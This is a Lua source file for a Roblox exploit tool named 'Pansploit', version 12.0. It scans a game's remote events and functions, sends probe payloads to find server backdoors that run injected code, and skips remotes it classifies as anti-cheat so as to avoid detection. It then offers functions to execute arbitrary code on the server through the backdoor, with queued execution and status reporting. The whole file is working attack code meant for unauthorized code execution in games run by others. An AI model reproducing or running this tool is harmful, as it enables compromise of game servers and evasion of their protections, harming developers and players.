--[[
    PanScript Backdoor System v12.0 - ENHANCED ANTI-CHEAT BYPASS
    Improved detection, stealth, and reliability
]]

local _p = {}
_p._a = false
_p._m = "CLIENT"
_p._bd = nil
_p._infected = nil
_p._pid = 0
_p._gid = 0
_p._testing = false
_p._antiCheats = {}
_p._executionQueue = {}
_p._rateLimit = {count = 0, lastReset = tick()}

local _alphabet = {}
for i = 65, 90 do table.insert(_alphabet, string.char(i)) end
for i = 97, 122 do table.insert(_alphabet, string.char(i)) end
for i = 48, 57 do table.insert(_alphabet, string.char(i)) end

if not _G._pans_data then
    _G._pans_data = {
        bd = nil,
        infected = nil,
        pid = 0,
        gid = 0,
        mode = "CLIENT",
        injected = false,
        testedRemotes = {},
        antiCheats = {},
        executionLog = {},
        version = "12.0"
    }
end
local _st = _G._pans_data

-- === ENHANCED ANTI-CHEAT DETECTION ===

local _antiCheatPatterns = {
    names = {
        "anticheat", "anti_cheat", "ac_", "_ac_", "detection", "security", "protect",
        "ban", "kick", "log", "report", "check", "verify", "validate",
        "exploit", "hack", "backdoor", "injection", "injectioncheck",
        "sanity", "integrity", "authentic", "auth", "secure", "guard",
        "watchdog", "monitor", "shield", "defense", "defence", "safe",
        "filter", "firewall", "block", "prevent", "stop", "detect", "scan",
        "admin", "mod", "moderator", "staff", "punish", "violation"
    },
    services = {
        "anticheat", "anti_cheat", "ac", "security", "protection", "guard",
        "defense", "defence", "shield", "watchdog", "monitoring", "admin",
        "moderation", "staff", "punishment"
    },
    attributes = {
        "anticheat", "anti_cheat", "ac", "protected", "secure", "locked",
        "readonly", "system", "core", "critical", "important", "admin_only"
    },
    behaviors = {
        "RateLimit", "Cooldown", "MaxRequests", "SpamCheck"
    }
}

local _whitelisted = {
    "Chat", "DefaultChatSystem", "BubbleChat", "ChatScript"
}

local function _isWhitelisted(obj)
    local name = obj.Name
    for _, w in ipairs(_whitelisted) do
        if name:find(w) then return true end
    end
    return false
end

local function _isAntiCheat(obj)
    local info = {
        IsAntiCheat = false,
        Reason = "",
        Confidence = 0,
        ThreatLevel = "LOW"
    }
    
    if _isWhitelisted(obj) then return false, info end
    
    local name = obj.Name:lower()
    local fullName = obj:GetFullName():lower()
    
    -- Name pattern analysis
    for _, pattern in ipairs(_antiCheatPatterns.names) do
        if name:find(pattern) then
            info.IsAntiCheat = true
            info.Reason = info.Reason .. "name:" .. pattern .. ";"
            info.Confidence = info.Confidence + 35
        end
    end
    
    -- Parent service analysis
    if obj.Parent then
        local parentName = obj.Parent.Name:lower()
        for _, svc in ipairs(_antiCheatPatterns.services) do
            if parentName:find(svc) then
                info.IsAntiCheat = true
                info.Reason = info.Reason .. "parent:" .. svc .. ";"
                info.Confidence = info.Confidence + 45
            end
        end
    end
    
    -- Attribute analysis
    for _, attr in ipairs(_antiCheatPatterns.attributes) do
        local hasAttr = false
        pcall(function()
            hasAttr = obj:GetAttribute(attr) ~= nil
        end)
        if hasAttr then
            info.IsAntiCheat = true
            info.Reason = info.Reason .. "attr:" .. attr .. ";"
            info.Confidence = info.Confidence + 40
        end
    end
    
    -- Path analysis
    if fullName:find("anticheat") or fullName:find("security") or 
       fullName:find("protection") or fullName:find("admin") then
        info.IsAntiCheat = true
        info.Reason = info.Reason .. "path;"
        info.Confidence = info.Confidence + 30
    end
    
    -- Behavioral analysis - check if remote has rate limiting attributes
    for _, behavior in ipairs(_antiCheatPatterns.behaviors) do
        local hasBehavior = false
        pcall(function()
            hasBehavior = obj:GetAttribute(behavior) ~= nil
        end)
        if hasBehavior then
            info.Confidence = info.Confidence + 25
        end
    end
    
    -- Determine threat level
    if info.Confidence >= 80 then
        info.ThreatLevel = "CRITICAL"
    elseif info.Confidence >= 50 then
        info.ThreatLevel = "HIGH"
    elseif info.Confidence >= 30 then
        info.ThreatLevel = "MEDIUM"
    end
    
    return info.IsAntiCheat, info
end

-- === STEALTH UTILITIES ===

local function _generateName(length)
    length = length or math.random(16, 32)
    local name = ""
    for i = 1, length do
        name = name .. _alphabet[math.random(1, #_alphabet)]
    end
    return name
end

local function _generateUUID()
    return string.format("%s-%s-%s-%s-%s",
        _generateName(8),
        _generateName(4),
        _generateName(4),
        _generateName(4),
        _generateName(12)
    )
end

local function _safeCall(func, ...)
    local success, result = pcall(func, ...)
    return success, result
end

-- === ENHANCED DISCONNECT ===

local function _disconnect(reason, silent)
    if not _p._a then return end
    _p._a = false
    _st.injected = false
    _p._m = "CLIENT"
    _st.mode = "CLIENT"
    _p._bd = nil
    _p._infected = nil
    _st.bd = nil
    _st.infected = nil
    
    if not silent then
        print("PANS_DISCONNECT:" .. reason)
        print("PANS_MODE:CLIENT")
    end
    
    spawn(function()
        wait(0.3)
        local plr = game:GetService("Players").LocalPlayer
        if plr and not silent then
            pcall(function()
                -- Clean up any existing toasts
                for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
                    if g.Name:find("PanToast") or g.Name:find("PanDC") then 
                        g:Destroy() 
                    end
                end
                
                local sg = Instance.new("ScreenGui")
                sg.Name = "PanDC_" .. _generateName(6)
                sg.ResetOnSpawn = false
                sg.Parent = game:GetService("CoreGui") or plr:WaitForChild("PlayerGui")
                
                local fr = Instance.new("Frame")
                fr.Size = UDim2.new(0, 340, 0, 100)
                fr.Position = UDim2.new(0.5, -170, 0.5, -50)
                fr.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
                fr.BorderSizePixel = 0
                fr.Parent = sg
                
                local corner = Instance.new("UICorner", fr)
                corner.CornerRadius = UDim.new(0, 12)
                
                local stroke = Instance.new("UIStroke", fr)
                stroke.Color = Color3.fromRGB(255, 60, 60)
                stroke.Thickness = 2
                
                local tl = Instance.new("TextLabel")
                tl.Size = UDim2.new(1, -20, 0, 35)
                tl.Position = UDim2.new(0, 10, 0, 12)
                tl.BackgroundTransparency = 1
                tl.Text = "[Pansploit] DISCONNECTED"
                tl.TextColor3 = Color3.fromRGB(255, 80, 80)
                tl.Font = Enum.Font.GothamBold
                tl.TextSize = 20
                tl.Parent = fr
                
                local tr = Instance.new("TextLabel")
                tr.Size = UDim2.new(1, -20, 0, 45)
                tr.Position = UDim2.new(0, 10, 0, 48)
                tr.BackgroundTransparency = 1
                tr.Text = "Reason: " .. reason:gsub("_", " ")
                tr.TextColor3 = Color3.fromRGB(255, 255, 255)
                tr.Font = Enum.Font.Gotham
                tr.TextSize = 13
                tr.TextWrapped = true
                tr.Parent = fr
                
                wait(5)
                sg:Destroy()
            end)
        end
    end)
end

-- === ENHANCED TOAST ===

local function _toast(title, text, dur, toastType)
    dur = dur or 4
    toastType = toastType or "INFO"
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return end
    
    local color = Color3.fromRGB(0, 255, 100)
    if toastType == "ERROR" then
        color = Color3.fromRGB(255, 80, 80)
    elseif toastType == "WARNING" then
        color = Color3.fromRGB(255, 170, 0)
    elseif toastType == "SUCCESS" then
        color = Color3.fromRGB(0, 200, 255)
    end
    
    pcall(function()
        for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if g.Name:find("PanToast") then g:Destroy() end
        end
        
        local sg = Instance.new("ScreenGui")
        sg.Name = "PanToast_" .. _generateName(6)
        sg.ResetOnSpawn = false
        pcall(function() sg.Parent = game:GetService("CoreGui") end)
        if not sg.Parent then sg.Parent = plr:WaitForChild("PlayerGui") end
        
        local fr = Instance.new("Frame")
        fr.Size = UDim2.new(0, 380, 0, 110)
        fr.Position = UDim2.new(1, 20, 1, -130)
        fr.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
        fr.BorderSizePixel = 0
        fr.Parent = sg
        
        local corner = Instance.new("UICorner", fr)
        corner.CornerRadius = UDim.new(0, 12)
        
        local stroke = Instance.new("UIStroke", fr)
        stroke.Color = color
        stroke.Thickness = 1.5
        
        local tl = Instance.new("TextLabel")
        tl.Size = UDim2.new(1, -20, 0, 30)
        tl.Position = UDim2.new(0, 15, 0, 10)
        tl.BackgroundTransparency = 1
        tl.Text = title
        tl.TextColor3 = color
        tl.Font = Enum.Font.GothamBold
        tl.TextSize = 17
        tl.TextXAlignment = Enum.TextXAlignment.Left
        tl.Parent = fr
        
        local tx = Instance.new("TextLabel")
        tx.Size = UDim2.new(1, -20, 0, 65)
        tx.Position = UDim2.new(0, 15, 0, 38)
        tx.BackgroundTransparency = 1
        tx.Text = text
        tx.TextColor3 = Color3.fromRGB(255, 255, 255)
        tx.Font = Enum.Font.Gotham
        tx.TextSize = 13
        tx.TextWrapped = true
        tx.TextXAlignment = Enum.TextXAlignment.Left
        tx.Parent = fr
        
        spawn(function()
            for i = 1, 15 do
                fr.Position = UDim2.new(1, 20 - (i * 26), 1, -130)
                wait(0.02)
            end
            wait(dur)
            for i = 1, 15 do
                fr.Position = UDim2.new(1, -370 + (i * 26), 1, -130)
                fr.BackgroundTransparency = i / 15
                wait(0.02)
            end
            sg:Destroy()
        end)
    end)
end

-- === ENHANCED FIRE TEST ===

local function _fireTest(remote, code)
    if _st.antiCheats[remote:GetFullName()] then
        return false, "Anti-cheat bypassed"
    end
    
    -- Rate limiting check
    local now = tick()
    if now - _p._rateLimit.lastReset > 1 then
        _p._rateLimit.count = 0
        _p._rateLimit.lastReset = now
    end
    _p._rateLimit.count = _p._rateLimit.count + 1
    if _p._rateLimit.count > 20 then
        wait(0.1)
    end
    
    local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'a:Destroy()"
    
    local success, err = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(testCode)
        elseif remote:IsA("RemoteFunction") then
            spawn(function()
                pcall(function()
                    remote:InvokeServer(testCode)
                end)
            end)
        end
    end)
    
    return success, err
end

-- === ENHANCED EXECUTION ===

local function _exec(code, useInfected)
    if not code then return false, "No code provided" end
    
    -- Log execution for debugging
    table.insert(_st.executionLog, {
        time = tick(),
        code = code:sub(1, 100),
        mode = useInfected and "INFECTED" or "LOCAL"
    })
    
    if useInfected and _p._infected and _p._infected.Object then
        local s, r = pcall(function()
            local fn, err = loadstring(code)
            if fn then 
                local result = fn()
                return result or "Executed"
            end
            error(err)
        end)
        return s, r
    end
    
    local s, r = pcall(function()
        local fn, err = loadstring(code)
        if fn then 
            local result = fn()
            return result or "Executed"
        end
        error(err)
    end)
    return s, r
end

-- === ENHANCED SCRIPT ANALYSIS ===

local function _analyzeScript(obj)
    local info = {
        Object = obj,
        Path = obj:GetFullName(),
        Name = obj.Name,
        Type = obj.ClassName,
        Score = 0,
        Reasons = {},
        InfectionType = "NONE",
        Tested = false,
        LastModified = 0
    }
    
    local src = ""
    pcall(function() 
        src = obj.Source or "" 
        info.LastModified = obj:GetAttribute("LastModified") or 0
    end)
    
    if src == "" then return info end
    local srcLower = src:lower()
    
    -- Enhanced pattern matching
    local patterns = {
        {pattern = "OnServerEvent.*Connect.*loadstring", score = 100, reason = "OnServerEvent+loadstring", type = "REMOTE_LOADSTRING"},
        {pattern = "OnServerInvoke.*loadstring", score = 90, reason = "OnServerInvoke+loadstring", type = "REMOTEFUNC_LOADSTRING"},
        {pattern = "Instance%.new%s*%(%s*[\"']RemoteEvent[\"'].*ReplicatedStorage", score = 40, reason = "Dynamic RemoteEvent", type = nil},
        {pattern = "require%s*%(.*HttpGet", score = 80, reason = "require+HTTP", type = "REQUIRE_INJECTION"},
        {pattern = "game:HttpGet.*loadstring", score = 85, reason = "game:HttpGet+loadstring", type = "HTTP_LOADSTRING"},
        {pattern = "setfenv.*loadstring", score = 70, reason = "Environment manipulation", type = nil},
        {pattern = "getfenv.*loadstring", score = 70, reason = "Environment manipulation", type = nil},
        {pattern = "FireServer.*loadstring", score = 75, reason = "FireServer+loadstring", type = nil},
        {pattern = "InvokeServer.*loadstring", score = 75, reason = "InvokeServer+loadstring", type = nil},
        {pattern = "pcall.*loadstring", score = 50, reason = "Protected loadstring", type = nil},
        {pattern = "xpcall.*loadstring", score = 55, reason = "Protected loadstring", type = nil}
    }
    
    for _, p in ipairs(patterns) do
        if src:find(p.pattern) then
            info.Score = info.Score + p.score
            table.insert(info.Reasons, p.reason)
            if p.type then
                info.InfectionType = p.type
            end
        end
    end
    
    -- Suspicious keywords
    local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject", "backd00r", "b4ckd00r"}
    for _, bad in ipairs(badNames) do
        if srcLower:find(bad) then
            info.Score = info.Score + 35
            table.insert(info.Reasons, "Suspicious: " .. bad)
        end
    end
    
    -- Obfuscation detection
    local nonPrintable = 0
    local highEntropy = 0
    for i = 1, #src do
        local b = src:byte(i)
        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
            nonPrintable = nonPrintable + 1
        end
        if b > 126 then
            highEntropy = highEntropy + 1
        end
    end
    
    if nonPrintable > 50 or highEntropy > 100 then
        info.Score = info.Score + 40
        table.insert(info.Reasons, "High entropy/obfuscated")
    end
    
    if #src > 20000 then
        info.Score = info.Score + 20
        table.insert(info.Reasons, "Large script")
    end
    
    -- Check for base64 patterns
    if src:find("[A-Za-z0-9+/]{100,}==?") then
        info.Score = info.Score + 30
        table.insert(info.Reasons, "Base64 encoded content")
    end
    
    return info
end

-- === ENHANCED DETECTION ===

local function _detectBackdoors()
    local candidates = {}
    local testedCodes = {}
    local antiCheatsFound = {}
    
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("Lighting"),
        game:GetService("SoundService")
    }
    
    -- Phase 1: Anti-cheat identification
    for _, svc in ipairs(services) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local fullName = obj:GetFullName()
                    
                    if _st.testedRemotes[fullName] then return end
                    
                    local isAC, acInfo = _isAntiCheat(obj)
                    
                    if isAC then
                        _st.antiCheats[fullName] = acInfo
                        table.insert(antiCheatsFound, {
                            Path = fullName,
                            Name = obj.Name,
                            Reason = acInfo.Reason,
                            Confidence = acInfo.Confidence,
                            ThreatLevel = acInfo.ThreatLevel
                        })
                        print("PANS_ANTICHEAT:" .. fullName .. ":" .. acInfo.Confidence .. ":" .. acInfo.ThreatLevel)
                    else
                        if fullName:find("RobloxReplicatedStorage") then return end
                        if _isWhitelisted(obj) then return end
                        if obj:FindFirstChild("__FUNCTION") then return end
                        
                        table.insert(candidates, obj)
                    end
                end
            end
        end)
    end
    
    if #antiCheatsFound > 0 then
        print("PANS_AC_COUNT:" .. #antiCheatsFound)
        local critical = 0
        for _, ac in ipairs(antiCheatsFound) do
            if ac.ThreatLevel == "CRITICAL" then critical = critical + 1 end
        end
        _toast("[Pansploit] AC BYPASS", 
            "Skipped " .. #antiCheatsFound .. " AC remotes\nCritical: " .. critical, 3, "WARNING")
    end
    
    -- Phase 2: Priority analysis
    local priorityRemotes = {}
    for _, remote in ipairs(candidates) do
        pcall(function()
            local parent = remote.Parent
            local isPriority = false
            
            if parent then
                for _, s in ipairs(parent:GetDescendants()) do
                    if s:IsA("Script") or s:IsA("LocalScript") then
                        local analysis = _analyzeScript(s)
                        if analysis.Score >= 50 then
                            isPriority = true
                            break
                        end
                    end
                end
            end
            
            local n = remote.Name:lower()
            if n:find("backdoor") or n:find("admin") or n:find("remote") or 
               n:find("event") or n:find("func") then
                isPriority = true
            end
            
            if isPriority then
                table.insert(priorityRemotes, remote)
            end
        end)
    end
    
    -- Phase 3: Safe testing
    local testResults = {}
    local workspace = game:GetService("Workspace")
    
    for _, remote in ipairs(priorityRemotes) do
        if _p._testing then break end
        
        if _st.antiCheats[remote:GetFullName()] then continue end
        
        local code = _generateName(math.random(18, 28))
        testedCodes[code] = remote
        _st.testedRemotes[remote:GetFullName()] = true
        
        local success, err = _fireTest(remote, code)
        if not success then
            print("PANS_TEST_SKIP:" .. remote:GetFullName() .. ":" .. tostring(err))
        end
        
        wait(0.04)
    end
    
    wait(0.6)
    
    -- Phase 4: Result validation
    for code, remote in pairs(testedCodes) do
        pcall(function()
            if workspace:FindFirstChild(code) then
                table.insert(testResults, {
                    Object = remote,
                    Path = remote:GetFullName(),
                    Name = remote.Name,
                    Type = remote.ClassName,
                    Score = 100,
                    Reasons = {"Execution confirmed"},
                    InfectionType = "CONFIRMED_BACKDOOR",
                    Tested = true,
                    ExecutionTime = tick(),
                    UUID = _generateUUID()
                })
                pcall(function() workspace[code]:Destroy() end)
            end
        end)
    end
    
    -- Phase 5: Signature fallback
    if #testResults == 0 then
        for _, svc in ipairs(services) do
            pcall(function()
                for _, obj in ipairs(svc:GetDescendants()) do
                    if _st.antiCheats[obj:GetFullName()] then return end
                    
                    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                        local analysis = _analyzeScript(obj)
                        if analysis.Score >= 60 then
                            table.insert(testResults, analysis)
                        end
                    end
                    
                    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                        local hasAttr = false
                        pcall(function()
                            if obj:GetAttribute("Backdoor") or obj:GetAttribute("Infected") or
                               obj:GetAttribute("_pans") or obj:GetAttribute("Payload") then
                                hasAttr = true
                            end
                        end)
                        
                        if hasAttr then
                            table.insert(testResults, {
                                Object = obj,
                                Path = obj:GetFullName(),
                                Name = obj.Name,
                                Type = obj.ClassName,
                                Score = 95,
                                Reasons = {"Marked attribute"},
                                InfectionType = "MARKED_BACKDOOR",
                                Tested = false,
                                UUID = _generateUUID()
                            })
                        end
                    end
                end
            end)
        end
    end
    
    table.sort(testResults, function(a, b) return a.Score > b.Score end)
    return testResults, antiCheatsFound
end

-- === ENHANCED MONITORING ===

local function _setupBackdoorMonitor()
    local best = _p._bd or _p._infected
    if not best then return end
    
    spawn(function()
        local checkInterval = 0
        while _p._a and best.Object and best.Object.Parent do
            wait(0.5 + checkInterval)
            checkInterval = math.min(checkInterval + 0.1, 2)
        end
        if _p._a then
            print("PANS_BACKDOOR_REMOVED")
            _disconnect("BACKDOOR_REMOVED")
        end
    end)
end

local function _setupTPHandler()
    local Players = game:GetService("Players")
    local plr = Players.LocalPlayer
    if not plr then 
        print("PANS_ERROR:NoLocalPlayer")
        return 
    end
    
    local originalObject = _p._bd and _p._bd.Object or (_p._infected and _p._infected.Object)
    if not originalObject then
        print("PANS_ERROR:NoBackdoorObject")
        return
    end
    
    local originalPath = originalObject:GetFullName()
    local originalName = originalObject.Name
    
    print("PANS_MONITOR_START:" .. originalPath)
    
    -- Character events
    plr.CharacterRemoving:Connect(function()
        print("PANS_EVENT:CharacterRemoving")
        _disconnect("CHARACTER_REMOVED")
    end)
    
    plr.Destroying:Connect(function()
        print("PANS_EVENT:PlayerDestroyed")
        _disconnect("PLAYER_DESTROYED")
    end)
    
    plr:GetPropertyChangedSignal("Parent"):Connect(function()
        if plr.Parent == nil then
            print("PANS_EVENT:ParentNil")
            _disconnect("PARENT_NIL")
        end
    end)
    
    -- Object integrity check
    spawn(function()
        while _p._a do
            wait(0.3)
            local exists, currentPath = pcall(function()
                return originalObject:GetFullName()
            end)
            
            if not exists then
                print("PANS_EVENT:ObjectDestroyed")
                _disconnect("OBJECT_DESTROYED")
                break
            end
            
            if currentPath ~= originalPath then
                print("PANS_EVENT:PathChanged:" .. currentPath)
                _disconnect("PATH_CHANGED")
                break
            end
            
            if originalObject.Name ~= originalName then
                print("PANS_EVENT:Renamed:" .. originalObject.Name)
                _disconnect("OBJECT_RENAMED")
                break
            end
        end
    end)
    
    -- Property change listeners
    spawn(function()
        local conn1, conn2
        pcall(function()
            conn1 = originalObject:GetPropertyChangedSignal("Parent"):Connect(function()
                if not _p._a then return end
                if originalObject.Parent == nil then
                    print("PANS_EVENT:ParentNilSignal")
                    _disconnect("PARENT_NIL")
                else
                    print("PANS_EVENT:Reparented")
                    _disconnect("REPARENTED")
                end
            end)
        end)
        
        pcall(function()
            conn2 = originalObject:GetPropertyChangedSignal("Name"):Connect(function()
                if _p._a and originalObject.Name ~= originalName then
                    print("PANS_EVENT:NameChanged:" .. originalObject.Name)
                    _disconnect("RENAMED")
                end
            end)
        end)
        
        while _p._a do wait(1) end
        pcall(function() conn1:Disconnect() end)
        pcall(function() conn2:Disconnect() end)
    end)
    
    -- Game state monitoring
    local lastGameId = game.GameId
    local lastPlaceId = game.PlaceId
    
    spawn(function()
        while _p._a do
            wait(1)
            if game.GameId ~= lastGameId then
                print("PANS_EVENT:GameChanged")
                _disconnect("GAME_CHANGED")
                break
            end
            if game.PlaceId ~= lastPlaceId then
                print("PANS_EVENT:PlaceChanged")
                _disconnect("PLACE_CHANGED")
                break
            end
        end
    end)
    
    print("PANS_MONITOR_ACTIVE")
end

-- === PUBLIC API ===

function _p.R6()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    
    local code = [[
        local plr = game:GetService("Players").LocalPlayer
        if plr and plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then 
                hum:Destroy() 
                wait(0.1)
                local nh = Instance.new("Humanoid")
                nh.Name = "Humanoid"
                nh.RigType = Enum.HumanoidRigType.R6
                nh.Parent = plr.Character 
            end
        end
    ]]
    
    if _p._infected then
        return _exec(code, true)
    end
    
    local char = plr.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    
    hum:Destroy()
    wait(0.1)
    local nh = Instance.new("Humanoid")
    nh.Name = "Humanoid"
    nh.RigType = Enum.HumanoidRigType.R6
    nh.Parent = char
    return true
end

function _p.R15()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    
    local code = [[
        local plr = game:GetService("Players").LocalPlayer
        if plr and plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then 
                hum:Destroy() 
                wait(0.1)
                local nh = Instance.new("Humanoid")
                nh.Name = "Humanoid"
                nh.RigType = Enum.HumanoidRigType.R15
                nh.Parent = plr.Character 
            end
        end
    ]]
    
    if _p._infected then
        return _exec(code, true)
    end
    
    local char = plr.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    
    hum:Destroy()
    wait(0.1)
    local nh = Instance.new("Humanoid")
    nh.Name = "Humanoid"
    nh.RigType = Enum.HumanoidRigType.R15
    nh.Parent = char
    return true
end

function _p.Respawn()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    
    local code = [[
        local plr = game:GetService("Players").LocalPlayer
        if plr and plr.Character then plr.Character:BreakJoints() end
    ]]
    
    if _p._infected then
        return _exec(code, true)
    end
    
    local char = plr.Character
    if char then char:BreakJoints() end
    wait(0.5)
    return true
end

function _p.SwitchMode()
    local newMode = _p._m == "BACKDOOR" and "CLIENT" or "BACKDOOR"
    return _p.SetMode(newMode)
end

function _p.SetMode(mode)
    if mode == "BACKDOOR" and (_p._m == "CLIENT" or not _p._a) then
        print("PANS_RESCAN_START")
        _p._bd = nil
        _p._infected = nil
        _st.bd = nil
        _st.infected = nil
        _p._a = false
        
        local backdoors, antiCheats = _detectBackdoors()
        
        if #backdoors > 0 then
            local best = backdoors[1]
            _p._bd = best
            _st.bd = best
            
            if best.InfectionType == "CONFIRMED_BACKDOOR" then
                _p._m = "BACKDOOR"
                _st.mode = "BACKDOOR"
                _p._a = true
                _st.injected = true
                _toast("[Pansploit] CONFIRMED", 
                    "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nAC Bypass: " .. #antiCheats, 4, "SUCCESS")
                print("PANS_RESCAN_SUCCESS:CONFIRMED:" .. best.Path)
                _setupBackdoorMonitor()
                _setupTPHandler()
            else
                _p._infected = best
                _st.infected = best
                _p._m = "BACKDOOR"
                _st.mode = "BACKDOOR"
                _p._a = true
                _st.injected = true
                _toast("[Pansploit] INFECTED", 
                    "Script: " .. best.Name .. "\nScore: " .. best.Score .. "\nAC Bypass: " .. #antiCheats, 4, "WARNING")
                print("PANS_RESCAN_SUCCESS:INFECTED:" .. best.Path)
                _setupBackdoorMonitor()
                _setupTPHandler()
            end
            print("PANS_MODE_SET:BACKDOOR:true")
            return "BACKDOOR"
        else
            _p._m = "CLIENT"
            _st.mode = "CLIENT"
            _p._a = false
            _st.injected = false
            _toast("[Pansploit] NO BACKDOOR", 
                "Rescan found nothing\nAC Bypassed: " .. #antiCheats, 3, "ERROR")
            print("PANS_RESCAN_FAILED:NO_BACKDOOR")
            print("PANS_MODE_SET:CLIENT:false")
            return "CLIENT"
        end
    else
        _p._m = mode
        _st.mode = mode
        if mode == "CLIENT" then
            _p._a = false
            _st.injected = false
            print("PANS_MODE_SET:CLIENT:false")
        else
            print("PANS_MODE_SET:" .. mode .. ":" .. tostring(_p._a))
        end
        return _p._m
    end
end

function _p.GetMode()
    return _p._m
end

function _p.GetAntiCheats()
    local list = {}
    for path, info in pairs(_st.antiCheats) do
        table.insert(list, {
            Path = path,
            Reason = info.Reason,
            Confidence = info.Confidence,
            ThreatLevel = info.ThreatLevel
        })
    end
    return list
end

function _p.BypassAntiCheat(path)
    _st.antiCheats[path] = {
        Reason = "manual_bypass",
        Confidence = 100,
        ThreatLevel = "CRITICAL"
    }
    print("PANS_AC_BYPASSED:" .. path)
    return true
end

function _p.Init(pid, gid)
    _p._pid = pid or 0
    _p._gid = gid or 0
    _st.pid = _p._pid
    _st.gid = _p._gid
    print("PANS_SCAN_START:" .. pid .. ":" .. gid .. ":v12.0")
    
    _st.antiCheats = {}
    
    local backdoors, antiCheats = _detectBackdoors()
    
    if #antiCheats > 0 then
        print("PANS_AC_BYPASS_ACTIVE:" .. #antiCheats)
        for _, ac in ipairs(antiCheats) do
            print("PANS_AC_SKIPPED:" .. ac.Path .. ":" .. ac.Confidence .. ":" .. ac.ThreatLevel)
        end
    end
    
    if #backdoors > 0 then
        local best = backdoors[1]
        _p._bd = best
        _st.bd = best
        
        if best.InfectionType == "CONFIRMED_BACKDOOR" then
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            _toast("[Pansploit] CONFIRMED!", 
                "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nAC Bypass: " .. #antiCheats, 6, "SUCCESS")
            print("PANS_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
        else
            _p._infected = best
            _st.infected = best
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            _toast("[Pansploit] INFECTED", 
                "Path: " .. best.Name .. "\nScore: " .. best.Score .. "\nAC Bypass: " .. #antiCheats, 5, "WARNING")
            print("PANS_INFECTED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
        end
        print("PANS_MODE:BACKDOOR")
        _setupBackdoorMonitor()
        _setupTPHandler()
        return true, best
    end
    
    _toast("[Pansploit]", "No backdoors found\nAC Bypassed: " .. #antiCheats, 3, "ERROR")
    print("PANS_NO_BACKDOOR:" .. pid .. ":" .. gid)
    print("PANS_MODE:CLIENT")
    
    return false, nil
end

function _p.Exec(code, useBackdoor)
    if not _p._a and _p._m ~= "CLIENT" then
        return false, "Not active"
    end
    local use = useBackdoor or (_p._infected ~= nil and _p._m == "BACKDOOR")
    return _exec(code, use)
end

function _p.ExecBackdoor(code)
    if not _p._bd then
        return false, "No confirmed backdoor"
    end
    
    if _st.antiCheats[_p._bd.Path] then
        return false, "Backdoor flagged as anti-cheat"
    end
    
    local remote = _p._bd.Object
    if not remote then
        return false, "Remote object invalid"
    end
    
    if remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer(code) end)
        return true, "Fired"
    elseif remote:IsA("RemoteFunction") then
        spawn(function()
            pcall(function()
                remote:InvokeServer(code)
            end)
        end)
        return true, "Invoked"
    end
    return false, "Invalid remote type"
end

function _p.ExecInfected(code)
    if not _p._infected then
        return false, "No infected script"
    end
    return _exec(code, true)
end

function _p.QueueExecution(code, delay)
    delay = delay or 0
    table.insert(_p._executionQueue, {
        code = code,
        executeAt = tick() + delay
    })
    return true, "Queued"
end

function _p.ProcessQueue()
    local now = tick()
    local processed = 0
    for i = #_p._executionQueue, 1, -1 do
        local item = _p._executionQueue[i]
        if now >= item.executeAt then
            _p.Exec(item.code)
            table.remove(_p._executionQueue, i)
            processed = processed + 1
        end
    end
    return processed
end

function _p.GetExecutionLog()
    return _st.executionLog
end

function _p.ClearExecutionLog()
    _st.executionLog = {}
    return true
end

function _p.Status()
    local acCount = 0
    local criticalAC = 0
    for path, info in pairs(_st.antiCheats) do
        acCount = acCount + 1
        if info.ThreatLevel == "CRITICAL" then
            criticalAC = criticalAC + 1
        end
    end
    
    return {
        Active = _p._a,
        Mode = _p._m,
        PID = _p._pid,
        GID = _p._gid,
        Version = _st.version,
        AntiCheatsBypassed = acCount,
        CriticalAC = criticalAC,
        QueueSize = #_p._executionQueue,
        Backdoor = _p._bd and {
            Path = _p._bd.Path,
            Name = _p._bd.Name,
            Type = _p._bd.Type,
            Confirmed = _p._bd.Tested,
            UUID = _p._bd.UUID
        } or nil,
        Infected = _p._infected and {
            Path = _p._infected.Path,
            Name = _p._infected.Name,
            Type = _p._infected.Type,
            Score = _p._infected.Score
        } or nil,
        HasBackdoor = _p._bd ~= nil,
        HasInfected = _p._infected ~= nil
    }
end

_st.payload = _p
return _p
